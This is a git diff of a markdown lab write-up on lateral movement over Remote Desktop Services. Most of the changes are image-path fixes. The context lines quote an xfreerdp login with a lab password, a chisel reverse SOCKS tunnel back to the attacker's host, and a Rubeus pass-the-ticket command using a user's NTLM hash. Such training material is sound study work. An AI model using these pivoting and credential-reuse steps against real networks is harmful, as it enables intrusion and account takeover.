@@ -37,10 +37,10 @@
 > FQDN = srv01.inlanefreight.local
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/nmap.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/nmap.png) 
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/netexec.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/netexec.png) 
 
 
 
@@ -58,7 +58,7 @@
 > This will open a client where we can specify the target IP address or domain name, and once we click Connect, it will prompt us for the credentials: 
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/mstsc.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/mstsc.png) 
 
 
 
@@ -113,7 +113,7 @@
 	$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.183.11 /dynamic-resolution /drive:tmp,/home/kali/Tools /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
 	
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/xfreerdp.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/xfreerdp.png) 
 
 
 > In this command: 
@@ -189,15 +189,15 @@
 >
 > In this lab, we have access to one single host. To connect to the other machines from our Linux attack host, we will need to set up a pivot method; in this case, we will use [chisel](https://github.com/jpillora/chisel). 
 > 
-> We will need to configure a **socks5 SOCKS proxy on port 1080 in the /etc/proxychains.conf file:** 
+> We will need to configure a ***socks5 SOCKS proxy on port 1080 in the /etc/proxychains.conf file:*** 
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/proxy-conf.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/proxy-conf.png) 
 
 > Next, on our Linux machine, we will initiate reverse port forwarding server: 
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/chisel-server.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/chisel-server.png) 
 
 > Then, in **SRV01**, we will connect to the server with the following command: 
 
@@ -205,12 +205,12 @@
 	C:\> chisel.exe client <VPN IP:PORT> R.socks
 	
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/chisel-client.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/chisel-client.png) 
 
 > If we run the ipconfig /all command on the Windows host we can see another internal IP 172.20.0.1. We can create a bash script and run a ping sweep against this subnet and we can see 3 additional hosts on this subnet that reply to our ping sweep. 
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/ping-sweep.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/ping-sweep.png) 
 
 1. 172.20.0.10
 2. 172.20.0.51
@@ -227,7 +227,7 @@
 > As we can see RestrictedAdmin is enabled on host 172.20.0.52
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/reg-check.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/reg-check.png) 
 
 
 	
@@ -241,7 +241,7 @@
 	
 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/ptt-1.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/ptt-1.png) 
 
 
 > In the new PowerShell window we will use Helen's hash to forge a Ticket-Granting ticket (TGT): 
@@ -250,7 +250,7 @@
 	PS C:\> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
 	
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/ptt-2.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/ptt-2.png) 
 
 
 
@@ -261,6 +261,6 @@
 	
 > And we have successfully pivoted from SVC01 to SVC02 with a Pass the Ticket attack. 
 
-![Lateral Movement](/Remote_Services/Remote-Desktop-Services/images/ptt-3.png) 
+![Lateral Movement](/Remote-Desktop-Services/images/ptt-3.png) 
 
 
